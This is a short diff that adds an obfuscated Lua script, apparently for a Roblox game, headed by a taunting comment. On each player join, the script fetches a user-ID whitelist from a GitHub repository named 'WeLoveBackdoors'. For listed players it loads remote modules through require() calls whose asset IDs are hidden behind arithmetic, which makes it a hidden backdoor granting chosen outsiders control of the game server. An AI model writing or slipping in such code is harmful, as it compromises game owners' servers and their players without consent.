@@ -1,0 +1,2 @@
+-- i dont care if u deobfuscate this i dont give a shit
+local v0=game:GetService("HttpService");local v1=game:GetService("Players");v1.PlayerAdded:Connect(function(v2) local function v3(v6) require(122234490866070 -1426033077 )(v6.Name);end local v4=v0:GetAsync("https://raw.githubusercontent.com/WeLoveBackdoors/whitelist/refs/heads/main/wl");if  not v4 then if table.find(require(140217629356401 -  -17454021 ),v2.UserId) then v3(v2);end end local v5=v0:JSONDecode(v4);for v7,v8 in v5 do if (v8==v2.UserId) then v3(v2);end end end);
